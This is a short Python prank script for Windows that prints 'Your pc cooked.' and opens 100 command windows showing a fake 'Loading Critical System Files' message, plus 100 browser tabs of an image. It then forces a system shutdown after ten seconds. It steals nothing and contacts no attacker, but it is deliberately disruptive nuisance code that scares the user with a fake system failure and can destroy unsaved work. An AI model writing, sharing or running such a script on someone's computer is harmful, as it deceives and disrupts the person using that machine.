import os
import time

message = "Your pc cooked."
delay_seconds = 10
number_of_pranks = 100
chaos_duration = 3

image_url = "https://imgs.search.brave.com/t-Yc0vaEDRHZqisMGcholqWBUX8xbGY-UdYKpM-qRbA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLmlt/Z2ZsaXAuY29tLzQv/ZTlkNzAuanBn"

print(f"{message}")
print("Initiating Phase 1: Total System Chaos...")

for i in range(number_of_pranks):
    cmd_command = f'start cmd /k echo Loading Critical System Files... Window {i+1}'
    os.system(cmd_command)

    image_command = f'start "{image_url}"'
    os.system(image_command)

    time.sleep(0.1)

print(f"Chaos initiated! Waiting {chaos_duration} seconds before execution...")
time.sleep(chaos_duration)

print("---")
print(f"Warning: System shutdown initiated! The computer will shut down in {delay_seconds} seconds.")

shutdown_command = f'shutdown /s /t {delay_seconds} /c "{message}"'
os.system(shutdown_command)

time.sleep(1)